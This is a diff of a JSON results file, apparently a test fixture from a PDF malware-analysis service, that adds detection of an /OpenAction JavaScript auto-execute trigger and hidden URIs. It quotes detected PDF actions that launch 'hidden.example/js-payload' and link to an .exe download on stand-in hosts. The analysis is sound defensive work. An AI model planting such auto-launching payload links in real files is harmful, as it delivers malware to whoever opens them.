@@ -1,18 +1,18 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 300,
+    "score": 1550,
     "sections": [
       {
         "auto_collapse": false,
         "body": {
-          "flags": 3,
-          "header": "%PDF-1.4",
-          "objects": 5,
+          "flags": 6,
+          "header": "%PDF-1.5",
+          "objects": 7,
           "parse_warnings": 0,
           "revisions": 1,
-          "size_bytes": 517,
-          "triggers": 1
+          "size_bytes": 713,
+          "triggers": 2
         },
         "body_config": {},
         "body_format": "KEY_VALUE",
@@ -28,8 +28,12 @@
         "auto_collapse": false,
         "body": [
           {
+            "code": "OPENACTION_JS",
+            "message": "/OpenAction co-occurs with /JavaScript \u2014 auto-execute pattern."
+          },
+          {
             "code": "URI_TO_EXECUTABLE",
-            "message": "obj 5 URI directly links to a .exe download: http://evil.example/payload.exe"
+            "message": "obj 5 URI directly links to a .exe download: http://hidden.example/uri-payload.exe"
           }
         ],
         "body_config": {
@@ -47,9 +51,10 @@
           ],
           "frequency": 1,
           "heur_id": 1,
-          "score": 300,
+          "score": 1050,
           "score_map": {},
           "signatures": {
+            "openaction_js": 1,
             "uri_to_executable": 1
           }
         },
@@ -62,12 +67,20 @@
         "auto_collapse": false,
         "body": [
           {
+            "code": "OBJSTM_PRESENT",
+            "message": "1 /ObjStm object stream(s) present (nested objects not expanded in this version)."
+          },
+          {
+            "code": "HAS_OPENACTION",
+            "message": "/OpenAction present \u2014 a target runs automatically when the document opens. Inspect the linked object."
+          },
+          {
             "code": "EXTERNAL_HOSTS",
-            "message": "PDF URIs contact 1 non-boilerplate host(s): evil.example"
+            "message": "PDF URIs contact 1 non-boilerplate host(s): hidden.example"
           },
           {
             "code": "UNCOMMON_TLD",
-            "message": "obj 5 URI host \"evil.example\" uses uncommon TLD \".example\"."
+            "message": "obj 5 URI host \"hidden.example\" uses uncommon TLD \".example\"."
           }
         ],
         "body_config": {
@@ -87,6 +100,8 @@
           "score_map": {},
           "signatures": {
             "external_hosts": 1,
+            "has_openaction": 1,
+            "objstm_present": 1,
             "uncommon_tld": 1
           }
         },
@@ -99,8 +114,14 @@
         "auto_collapse": false,
         "body": [
           {
-            "detail": "<</Type/Action/S/URI/URI(http://evil.example/payload.exe)>>",
-            "path": "Page \u2192 obj 4 [Annot:Link] \u2192 /A \u2192 obj 5 [Action:URI]",
+            "detail": "<</S/JavaScript/JS(app.launchURL(\"http://hidden.example/js-payload\"))/Type/Action>>",
+            "path": "Catalog (obj 1) \u2192 /OpenAction \u2192 obj 4 [Action:JavaScript]",
+            "severity": "HIGH",
+            "trigger": "/OpenAction"
+          },
+          {
+            "detail": "<</Type/Action/S/URI/URI(http://hidden.example/uri-payload.exe)>>",
+            "path": "Page \u2192 obj 7 [Annot:Link] \u2192 /A \u2192 obj 5 [Action:URI]",
             "severity": "MED",
             "trigger": "/Annot /A"
           }
@@ -116,7 +137,16 @@
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
-        "heuristic": null,
+        "heuristic": {
+          "attack_ids": [
+            "T1204"
+          ],
+          "frequency": 1,
+          "heur_id": 5,
+          "score": 500,
+          "score_map": {},
+          "signatures": {}
+        },
         "promote_to": null,
         "tags": {},
         "title_text": "Catalog trigger paths",
@@ -126,18 +156,26 @@
         "auto_collapse": false,
         "body": [
           {
+            "found_in": "obj 4 (inside object stream 6)",
             "type": "uri",
-            "value": "http://evil.example/payload.exe"
+            "value": "http://hidden.example/js-payload"
           },
           {
+            "found_in": "obj 5 (inside object stream 6)",
+            "type": "uri",
+            "value": "http://hidden.example/uri-payload.exe"
+          },
+          {
+            "found_in": "host of a hidden URL",
             "type": "domain",
-            "value": "evil.example"
+            "value": "hidden.example"
           }
         ],
         "body_config": {
           "column_order": [
             "type",
-            "value"
+            "value",
+            "found_in"
           ]
         },
         "body_format": "TABLE",
@@ -149,15 +187,16 @@
           "network": {
             "static": {
               "domain": [
-                "evil.example"
+                "hidden.example"
               ],
               "uri": [
-                "http://evil.example/payload.exe"
+                "http://hidden.example/js-payload",
+                "http://hidden.example/uri-payload.exe"
               ]
             }
           }
         },
-        "title_text": "Cleartext indicators of compromise",
+        "title_text": "Hidden indicators (compressed or encoded)",
         "zeroize_on_tag_safe": false
       }
     ]
@@ -167,7 +206,7 @@
     "supplementary": [
       {
         "name": "pdfstudio_report.json",
-        "sha256": "a2fa5e42be938342ccd3a6bd22de5da0641c65ed3f3020f239842a8f92b9c4f3"
+        "sha256": "704818cee343251c60cebbdbf3837d24df544b3492af710c6662df0415028f88"
       }
     ]
   },
@@ -179,6 +218,7 @@
         ],
         "heur_id": 1,
         "signatures": [
+          "openaction_js",
           "uri_to_executable"
         ]
       },
@@ -186,9 +226,18 @@
         "attack_ids": [],
         "heur_id": 4,
         "signatures": [
+          "objstm_present",
+          "has_openaction",
           "external_hosts",
           "uncommon_tld"
         ]
+      },
+      {
+        "attack_ids": [
+          "T1204"
+        ],
+        "heur_id": 5,
+        "signatures": []
       }
     ],
     "tags": {
@@ -196,14 +245,19 @@
         {
           "heur_id": null,
           "signatures": [],
-          "value": "evil.example"
+          "value": "hidden.example"
         }
       ],
       "network.static.uri": [
         {
           "heur_id": null,
           "signatures": [],
-          "value": "http://evil.example/payload.exe"
+          "value": "http://hidden.example/js-payload"
+        },
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "http://hidden.example/uri-payload.exe"
         }
       ]
     },
